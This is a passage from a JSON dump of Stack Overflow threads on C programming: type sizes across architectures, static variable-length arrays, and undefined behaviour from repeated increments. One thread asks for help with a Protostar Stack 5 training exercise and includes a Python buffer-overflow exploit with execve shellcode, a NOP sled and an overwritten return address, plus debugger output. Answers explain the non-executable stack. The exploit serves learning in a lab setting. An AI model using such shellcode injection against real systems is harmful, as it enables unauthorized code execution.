145, "user_id": 5638095, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/2b5766214fcebc21c9a2e6ba434c6c1e?s=128&d=identicon&r=PG&f=1", "display_name": "AlbertusFar", "link": "https://stackoverflow.com/users/5638095/albertusfar"}, "reply_to_user": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1482945856, "post_id": 41366299, "comment_id": 69935070, "body": "Updated :) @CodyGray"}, {"owner": {"reputation": 683, "user_id": 3385907, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5269c30229193b14d8e5e2ebbee3847?s=128&d=identicon&r=PG&f=1", "display_name": "Irisshpunk", "link": "https://stackoverflow.com/users/3385907/irisshpunk"}, "edited": false, "score": 0, "creation_date": 1482973922, "post_id": 41366299, "comment_id": 69945558, "body": "Did you try to inspect the instruction at eip = 0x80483da to make sure you were executing a ret as expected?"}, {"owner": {"reputation": 321, "user_id": 4446356, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5fUXH.jpg?s=128&g=1", "display_name": "bananaappletw", "link": "https://stackoverflow.com/users/4446356/bananaappletw"}, "edited": false, "score": 0, "creation_date": 1483022464, "post_id": 41366299, "comment_id": 69965555, "body": "I am suspicious about how that happens. Do you execute your code on that website&#39;s provided iso&#39;s system?"}, {"owner": {"reputation": 312, "user_id": 6032037, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UEWJ8.png?s=128&g=1", "display_name": "gmelodie", "link": "https://stackoverflow.com/users/6032037/gmelodie"}, "edited": false, "score": 1, "creation_date": 1544446757, "post_id": 41366299, "comment_id": 94266848, "body": "This question has been answered in <a href=\"https://security.stackexchange.com/questions/72653/exploiting-buffer-overflow-leads-to-segfault?newreg=8afd72fe81c14d3aae8352877af6c138\">Exploiting buffer overflow leads to segfault</a>"}], "answers": [{"comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1548890450, "post_id": 54440021, "comment_id": 95710613, "body": "You should probably mention that compiling with <code>gcc -zexecstack</code> will make the stack (and .data and heap) executable, changing from this more-secure default."}], "tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 1, "last_activity_date": 1548849137, "last_edit_date": 1592644375, "creation_date": 1548849137, "answer_id": 54440021, "question_id": 41366299, "link": "https://stackoverflow.com/questions/41366299/segmentation-fault-on-buffer-buffer-overflow/54440021#54440021", "title": "Segmentation fault on buffer buffer overflow", "body": "<p>LTKills was most probably right saying &quot;<em>This question has been answered in <a href=\"https://security.stackexchange.com/questions/72653/exploiting-buffer-overflow-leads-to-segfault?newreg=8afd72fe81c14d3aae8352877af6c138\">Exploiting buffer overflow leads to segfault</a></em>&quot;, where the answer is:</p>\n<blockquote>\n<p>Your memory address 0xbffff\u202680 is most likely non-executable, but only read/write.</p>\n</blockquote>\n<p>You can verify this e. g. with <code>/proc/\u2026/maps</code>:</p>\n<ul>\n<li>start your C program without input, so that it waits for input</li>\n<li>suspend it with Ctrl-Z, or do the following from another terminal</li>\n<li>enter <code>cat /proc/`pidof a.out`/maps</code> (with the C program's name instead of <code>a.out</code>, if different)</li>\n</ul>\n<p>You should see something similar to this:</p>\n<pre><code>08048000-08049000 r-xp 00000000 00:16 6723524   /home/armali/bin/so/c/a.out\n08049000-0804a000 rw-p 00000000 00:16 6723524   /home/armali/bin/so/c/a.out\nf7635000-f7636000 rw-p 00000000 00:00 0 \nf7636000-f7774000 r-xp 00000000 08:08 371440    /lib/libc-2.11.3.so\nf7774000-f7775000 ---p 0013e000 08:08 371440    /lib/libc-2.11.3.so\nf7775000-f7777000 r--p 0013e000 08:08 371440    /lib/libc-2.11.3.so\nf7777000-f7778000 rw-p 00140000 08:08 371440    /lib/libc-2.11.3.so\nf7778000-f777b000 rw-p 00000000 00:00 0 \nf7796000-f7799000 rw-p 00000000 00:00 0 \nf7799000-f779a000 r-xp 00000000 00:00 0         [vdso]\nf779a000-f77b5000 r-xp 00000000 08:08 371433    /lib/ld-2.11.3.so\nf77b5000-f77b6000 r--p 0001b000 08:08 371433    /lib/ld-2.11.3.so\nf77b6000-f77b7000 rw-p 0001c000 08:08 371433    /lib/ld-2.11.3.so\nff8fb000-ff910000 rw-p 00000000 00:00 0         [stack]\n</code></pre>\n<p>Here the <code>[stack]</code> segment is not executable (no <code>x</code> there).</p>\n"}], "owner": {"reputation": 145, "user_id": 5638095, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/2b5766214fcebc21c9a2e6ba434c6c1e?s=128&d=identicon&r=PG&f=1", "display_name": "AlbertusFar", "link": "https://stackoverflow.com/users/5638095/albertusfar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 971, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1548851465, "creation_date": 1482943588, "last_edit_date": 1548851465, "question_id": 41366299, "link": "https://stackoverflow.com/questions/41366299/segmentation-fault-on-buffer-buffer-overflow", "title": "Segmentation fault on buffer buffer overflow", "body": "<p>I tried to learn how buffer overflow works and I did some exercises from exploit-exercises.com. I tried to solve Protostar Stack 5 problem. The code is writen in C. <a href=\"https://exploit-exercises.com/protostar/stack5/\" rel=\"nofollow noreferrer\">Here</a> is the code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(int argc, char **argv)\n{\n  char buffer[64];\n\n  gets(buffer);\n}\n</code></pre>\n\n<p>The buffer starts at <code>0xbffff770</code> and the return is located at <code>0xbffff7bc</code> so I have 76 byte space (<code>0xbffff7bc - 0xbffff770 = 0x4c = 76</code>) to put nop sled and shellcode. The shellcode size is 23 Byte, so I put 53 Byte of nop sled to my stack and I redirect the eip register in the middle of my nop sled which is <code>0x0xbffff770 + 16</code>. Here is my script to produce the exploit writen in python:</p>\n\n<pre><code>import struct\n\neip = struct.pack(\"I\", 0xbffff770 + 16) \nnop = \"\\x90\" * 53\npayload = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\n           \\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n\nprint nop + payload + eip\n</code></pre>\n\n<p>But after i run this exploit on the program, I got <code>Segmentetion Fault</code>. Can someone explain me why i got this error?</p>\n\n<p>The memory after running the exploit:</p>\n\n<pre><code>0xbffff770: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffff780: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffff790: 0x90909090  0x90909090  0x90909090  0x90909090\n0xbffff7a0: 0x90909090  0x50c03190  0x732f2f68  0x622f6868\n0xbffff7b0: 0xe3896e69  0xe1895350  0x80cd0bb0  0xbffff780\n</code></pre>\n\n<p>The ret address is located at <code>0xbffff7bc</code> and directed to <code>0xbffff780</code> (which is nop sled), and the shellcode start from <code>0xbffff7a5</code> until <code>0xbffff7bc</code></p>\n\n<p>info register:</p>\n\n<pre><code>eax            0xbffff770   -1073744016\necx            0xbffff770   -1073744016\nedx            0xb7fd9334   -1208118476\nebx            0xb7fd7ff4   -1208123404\nesp            0xbffff7bc   0xbffff7bc\nebp            0x80cd0bb0   0x80cd0bb0\nesi            0x0  0\nedi            0x0  0\neip            0x80483da    0x80483da &lt;main+22&gt;\neflags         0x200246 [ PF ZF IF ID ]\ncs             0x73 115\nss             0x7b 123\nds             0x7b 123\nes             0x7b 123\nfs             0x0  0\ngs             0x33 51\n</code></pre>\n\n<p>By the way, I tried to put the redirect ret address 5 times so I decreased the nop sled to 33 byte (<code>nop sled(33 byte) + shellcode(23 byte) + ret addr(4 byte * 5)</code>) and this worked, but why I get segfault at the first exploit. I do not understand why.</p>\n"}, {"tags": ["c", "architecture"], "comments": [{"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 1, "creation_date": 1482942766, "post_id": 41365987, "comment_id": 69933580, "body": "Because standard allows it to be. The reason is mainly historical and backward compatibility. If you need fixed width integers, look at <code>&lt;stdint.h&gt;</code> provided by C99."}, {"owner": {"reputation": 100, "user_id": 3668810, "user_type": "registered", "profile_image": "https://graph.facebook.com/100001586968649/picture?type=large", "display_name": "berendeanicolae", "link": "https://stackoverflow.com/users/3668810/berendeanicolae"}, "edited": false, "score": 0, "creation_date": 1482942863, "post_id": 41365987, "comment_id": 69933622, "body": "64 bit processors have registers that work with 64 bit numbers. On 32 bit processors, these operations on 64 bit numbers are &quot;emulated&quot; thus being slower."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1482944176, "post_id": 41365987, "comment_id": 69934280, "body": "According to <a href=\"https://en.wikipedia.org/wiki/64-bit_computing\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/64-bit_computing</a> ,  IL32P64 and  I32LP64 are the majority, so &quot;int size in 32bit is 4 byte and 8 byte in 64bit&quot; is very inaccurate."}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1482944733, "post_id": 41365987, "comment_id": 69934541, "body": "Also 64 bit data types can have performance impacts, depending on on implementation. For this reason x32 ABI has been invented to downgrade the pointer size back to 32 bit on x86-64 hardware and has shown better performance over x86-64. Similarly Android on ARM64 also choose to use a 32 bit user space. For the same reason, int type stayed at 16 bit for a long time after i386 was released."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1482951762, "post_id": 41365987, "comment_id": 69937913, "body": "You forgot to tell why you expect them to have the same size. And why don&#39;t you ask only ask about 32 and 64, not 8 or 16 bit systems? Or 18 or 24 bit systems?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482969284, "post_id": 41365987, "comment_id": 69944470, "body": "On most 32-bit and 64-bit systems, <code>sizeof(int) == 4</code> (assuming <code>CHAR_BIT == 8) \u2014 though the standards allow it to be as small as 2 (16-bit </code>int` is valid) or larger.  The size of <code>long</code> can be different; on 32-bit systems, it is normally the same size as <code>int</code>, but on Unix-based 64-bit systems, it is usually 8 (64 bits) whereas on 64-bit Windows it is still 4 (32 bits).  Have fun.  Try Java if you want the same sizes everywhere.  C is older and differently regulated from Java."}, {"owner": {"reputation": 960, "user_id": 6800638, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8032bc02138a88415e190d8f607ad64a?s=128&d=identicon&r=PG&f=1", "display_name": "Aman Jaiswal", "link": "https://stackoverflow.com/users/6800638/aman-jaiswal"}, "edited": false, "score": 0, "creation_date": 1482992534, "post_id": 41365987, "comment_id": 69950011, "body": "Olaf...  because I think there is same reason behind it and currently 32 bit and 64 bit running thats why I am asking that....."}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 3, "last_activity_date": 1482943155, "creation_date": 1482943155, "answer_id": 41366189, "question_id": 41365987, "link": "https://stackoverflow.com/questions/41365987/different-size-of-c-data-type-in-32-and-64-bit/41366189#41366189", "title": "different size of c data type in 32 and 64 bit", "body": "<blockquote>\n  <p>Why there is different size of C data types in 32bit and 64 bit system[?]</p>\n</blockquote>\n\n<p>The sizes of C's basic data types are implementation-dependent.  They are not necessarily dependent on machine architecture, and counterexamples abound.  For example, 32-bit and 64-bit implementations of GCC use the same size data types for x86 and x86_64.</p>\n\n<blockquote>\n  <p>what is the reason behind it to double the size of data types in 64bit[?]</p>\n</blockquote>\n\n<p>The reasons for implementation decisions vary with implementors and implementation characteristics.  <code>int</code> is often, but not always, chosen to have a size that is natural for the target machine in some sense.  That might mean that operations on it are fast, or that it is efficient to load from and store to memory, or other things.  These are the kinds of considerations involved.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 0, "last_activity_date": 1482948031, "creation_date": 1482948031, "answer_id": 41367348, "question_id": 41365987, "link": "https://stackoverflow.com/questions/41365987/different-size-of-c-data-type-in-32-and-64-bit/41367348#41367348", "title": "different size of c data type in 32 and 64 bit", "body": "<p>The C language definition does not mandate a specific size for most data types; instead, specifies the <em>range</em> of values each type must be able to represent.  <code>char</code> must be large enough to represent a single character of the execution character set (<em>at least</em> the range <code>[-127,127]</code>), <code>short</code> and <code>int</code> must be large enough to represent <em>at least</em> the range <code>[-32767,32767]</code>, etc.</p>\n\n<p>Traditionally, the size of <code>int</code> was the same as the \"natural\" word size for a given architecture, on the premise that a) it would be easier to implement, and b) operations on that type would be the most efficient.  Whether that's still true today, I'm not qualified to say (not a hardware guy).  </p>\n"}], "owner": {"reputation": 960, "user_id": 6800638, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/8032bc02138a88415e190d8f607ad64a?s=128&d=identicon&r=PG&f=1", "display_name": "Aman Jaiswal", "link": "https://stackoverflow.com/users/6800638/aman-jaiswal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3145, "favorite_count": 2, "accepted_answer_id": 41366189, "answer_count": 2, "score": 2, "last_activity_date": 1482948031, "creation_date": 1482942261, "question_id": 41365987, "link": "https://stackoverflow.com/questions/41365987/different-size-of-c-data-type-in-32-and-64-bit", "title": "different size of c data type in 32 and 64 bit", "body": "<p>Why there is different size of C data types in 32bit and 64 bit system...</p>\n\n<p>for example: int size in 32bit is 4 byte and 8 byte in 64bit</p>\n\n<p>what is the reason behind it to double the size of data types in 64bit as well as My knowledge is concern there is no performance issue if we are going to use same size in 64 bit system as it is in 32 bit....</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 1, "creation_date": 1482942272, "post_id": 41365900, "comment_id": 69933305, "body": "C99? What is the error? Paste <code>lengthOfaString</code> declaration please"}, {"owner": {"reputation": 355, "user_id": 7116110, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ee927d441a821a9584b5ed2befb15359?s=128&d=identicon&r=PG&f=1", "display_name": "Igino Boffa", "link": "https://stackoverflow.com/users/7116110/igino-boffa"}, "edited": false, "score": 2, "creation_date": 1482942276, "post_id": 41365900, "comment_id": 69933309, "body": "Because you cannot determine the lenght of a string in a static context."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 6, "creation_date": 1482942348, "post_id": 41365900, "comment_id": 69933357, "body": "Because static <i>storage duration</i> means the object exists for the entire life of the program, including before any non-constant expression -- such as one used as an array length -- is evaluated.  Thus, the length of a static array needs to be a compile-time constant."}, {"owner": {"reputation": 1840, "user_id": 3105448, "user_type": "registered", "profile_image": "https://graph.facebook.com/1200393761/picture?type=large", "display_name": "Amjad", "link": "https://stackoverflow.com/users/3105448/amjad"}, "reply_to_user": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 0, "creation_date": 1482942373, "post_id": 41365900, "comment_id": 69933370, "body": "@DavidIsla <code>lengthOfaString</code> is an <code>int</code> variable that holds a length of another string"}, {"owner": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 0, "creation_date": 1482942467, "post_id": 41365900, "comment_id": 69933422, "body": "Read comments above please. Can you declare <code>lengthOfaString</code> as <code>static const int lengthOfaString = 250;</code>?"}, {"owner": {"reputation": 1840, "user_id": 3105448, "user_type": "registered", "profile_image": "https://graph.facebook.com/1200393761/picture?type=large", "display_name": "Amjad", "link": "https://stackoverflow.com/users/3105448/amjad"}, "reply_to_user": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 0, "creation_date": 1482942565, "post_id": 41365900, "comment_id": 69933472, "body": "@DavidIsla No I can not declare it as a <code>static const int</code>. It is the length of a randomly chosen string."}, {"owner": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 0, "creation_date": 1482942671, "post_id": 41365900, "comment_id": 69933526, "body": "so...@JohnBollinger gave you the answer +1"}, {"owner": {"reputation": 1840, "user_id": 3105448, "user_type": "registered", "profile_image": "https://graph.facebook.com/1200393761/picture?type=large", "display_name": "Amjad", "link": "https://stackoverflow.com/users/3105448/amjad"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1482942736, "post_id": 41365900, "comment_id": 69933563, "body": "Thanks @JohnBollinger Your explanation makes sense."}, {"owner": {"reputation": 1840, "user_id": 3105448, "user_type": "registered", "profile_image": "https://graph.facebook.com/1200393761/picture?type=large", "display_name": "Amjad", "link": "https://stackoverflow.com/users/3105448/amjad"}, "reply_to_user": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 0, "creation_date": 1482942784, "post_id": 41365900, "comment_id": 69933583, "body": "Thanks @DavidIsla for your comments"}, {"owner": {"reputation": 1840, "user_id": 3105448, "user_type": "registered", "profile_image": "https://graph.facebook.com/1200393761/picture?type=large", "display_name": "Amjad", "link": "https://stackoverflow.com/users/3105448/amjad"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1482942857, "post_id": 41365900, "comment_id": 69933619, "body": "@JohnBollinger can you make your comment as an answer I think will be more clear and useful for other people."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 2, "creation_date": 1482953235, "post_id": 41365900, "comment_id": 69938510, "body": "@DavidIsla This does not change anything. It still is a variable. C is not C++!"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 623, "user_id": 4357941, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-uGqwOMmMeMU/AAAAAAAAAAI/AAAAAAAAFPU/s-5WnAzDmHI/photo.jpg?sz=128", "display_name": "David Isla", "link": "https://stackoverflow.com/users/4357941/david-isla"}, "edited": false, "score": 0, "creation_date": 1482957398, "post_id": 41365900, "comment_id": 69940278, "body": "@DavidIsla: More precisely, even with <code>static const</code>, the name of <code>lengthOfaString</code> is not a constant expression (even though a compiler may be able to evaluate it at compile time)."}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 6, "last_activity_date": 1482944216, "creation_date": 1482944216, "answer_id": 41366463, "question_id": 41365900, "link": "https://stackoverflow.com/questions/41365900/variable-length-arrays-and-static-declaration-in-c/41366463#41366463", "title": "Variable length arrays and static declaration in c", "body": "<p>When applied to a local identifier, the <code>static</code> keyword specifies that the object designated by that identifier has <em>static storage duration</em>.  That means the object exists for the entire life of the program, from before the evaluation of any non-constant expression.</p>\n\n<p>By definition, variable-length arrays have length designated by an expression that is evaluated at runtime, when control reaches the array declaration.  The system cannot provide for such an object to have static storage duration because it does not know the object's size until some time after the object must already exist.</p>\n\n<p>Note also that all file-scope variables have static storage duration, and therefore VLAs cannot be declared at file scope at all.  Indeed, at file scope, the <code>static</code> keyword has nothing to do with storage duration; instead, in that context it specifies <em>internal linkage</em>.</p>\n"}], "owner": {"reputation": 1840, "user_id": 3105448, "user_type": "registered", "profile_image": "https://graph.facebook.com/1200393761/picture?type=large", "display_name": "Amjad", "link": "https://stackoverflow.com/users/3105448/amjad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 349, "favorite_count": 1, "accepted_answer_id": 41366463, "answer_count": 1, "score": -1, "last_activity_date": 1482968758, "creation_date": 1482941961, "last_edit_date": 1482968758, "question_id": 41365900, "link": "https://stackoverflow.com/questions/41365900/variable-length-arrays-and-static-declaration-in-c", "title": "Variable length arrays and static declaration in c", "body": "<p>Why can't variable length arrays in C be declared as static? \nFor example, this declaration is not allowed:</p>\n\n<pre><code>static char str1[lengthOfaString];\n</code></pre>\n"}, {"tags": ["c", "post-increment", "pre-increment"], "comments": [{"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 1, "creation_date": 1482942668, "post_id": 41365876, "comment_id": 69933523, "body": "Also <a href=\"http://stackoverflow.com/questions/11060968/using-the-post-increment-in-function-arguments\" title=\"using the post increment in function arguments\">stackoverflow.com/questions/11060968/&hellip;</a> and many other questions."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1482942745, "post_id": 41365876, "comment_id": 69933569, "body": "Sorry, I didn&#39;t immediately realize that it was not a function call. However, it does not change the essence of the issue."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1482953432, "post_id": 41365876, "comment_id": 69938600, "body": "Read the info page before asking! This is one of the &quot;do not ask&quot; questions."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 0, "creation_date": 1482953490, "post_id": 41365876, "comment_id": 69938627, "body": "@AnT: why not dup-hammer then?"}], "answers": [{"comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1482943962, "post_id": 41365921, "comment_id": 69934171, "body": "It worth noting, that converting it to a function call won&#39;t solve the problem, as the order of operands evaluation is not defined too.."}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": true, "score": 6, "last_activity_date": 1482942034, "creation_date": 1482942034, "answer_id": 41365921, "question_id": 41365876, "link": "https://stackoverflow.com/questions/41365876/c-pre-and-post-increment-different-answers-in-different-programs/41365921#41365921", "title": "C, pre and post increment, different answers in different programs", "body": "<p>It's <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"noreferrer\"><em>undefined behaviour</em></a>.</p>\n\n<p>After the macro replacement</p>\n\n<pre><code>a = hypotenusa(++x, ++x);\n</code></pre>\n\n<p>becomes:</p>\n\n<pre><code>a = sqrt((++x) * (++x) + (++x) * (++x));\n</code></pre>\n\n<p>As you can see <code>x</code> is modified multiple times without any intervening sequence point(s). See <a href=\"http://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html\" rel=\"noreferrer\">What Every C Programmer Should Know About Undefined Behavior</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": "https://stackoverflow.com/users/34824/abelenky"}, "edited": false, "score": 0, "creation_date": 1482942385, "post_id": 41365932, "comment_id": 69933376, "body": "<code>hypotenusa</code> is a macro, not a function call, and there is nothing wrong with incrementing a variable during a function call, so long as you increment it ONLY ONCE.  Trouble happens when you increment the same variable multiple times."}, {"owner": {"reputation": 5994, "user_id": 5698738, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4tnZ9.jpg?s=128&g=1", "display_name": "Aganju", "link": "https://stackoverflow.com/users/5698738/aganju"}, "reply_to_user": {"reputation": 58292, "user_id": 34824, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/ri8DI.jpg?s=128&g=1", "display_name": "abelenky", "link": 